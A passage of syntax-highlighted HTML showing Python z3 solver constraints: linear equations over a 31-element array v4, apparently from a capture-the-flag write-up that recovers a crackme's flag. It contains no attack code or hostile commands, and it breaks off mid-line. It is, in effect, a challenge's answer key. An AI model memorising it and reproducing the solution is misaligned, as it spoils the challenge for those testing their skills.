s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">270</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">370</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">235</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">150</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">140</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">94</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">295</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">176</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">94</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">258</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">302</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">171</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">278</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">193</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">251</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">284</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">218</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token number">319</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">125</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">267</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">160</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">111</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">174</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">480557</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">87</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">260</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">326</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">210</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">357</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">170</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">315</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">376</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">227</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">43</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">358</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">364</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">309</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">282</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">286</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">365</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">287</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">377</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">225</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">328</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">223</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">120</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">102</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">162</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">123</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">196</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">352</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">666967</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">61</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">195</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">125</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token number">260</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">202</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">116</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">230</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">326</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">211</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">371</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">353</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">124</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">188</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">163</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">140</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">51</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">262</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">229</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">113</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">158</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">378</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">365</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">207</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">277</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">190</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">320</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">347</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">137</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">590534</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">39</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">303</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">360</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">157</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">324</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">77</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">308</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">313</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">87</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">201</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">50</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">193</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">184</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">205</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">140</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">311</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">304</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">356</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">156</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">157</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">150</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">429108</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">157</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">137</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">71</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">269</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">161</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">317</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">296</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">385</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">165</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">159</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">132</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">296</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">162</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">254</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">172</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">132</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">369</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">257</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">134</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">384</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">255</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">229</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">129</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">112</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">17</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">222</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">126</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">563521</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">207</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">111</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">138</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">223</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">142</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">154</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">111</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">341</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">175</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">259</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">225</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">334</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">250</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">198</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">279</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">301</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">193</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">334</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">134</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">183</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">270</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">275</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">163</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">493999</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">393</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">176</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">105</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">162</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">148</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">281</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">300</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">342</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">262</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">152</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">43</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">296</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">273</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">75</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token 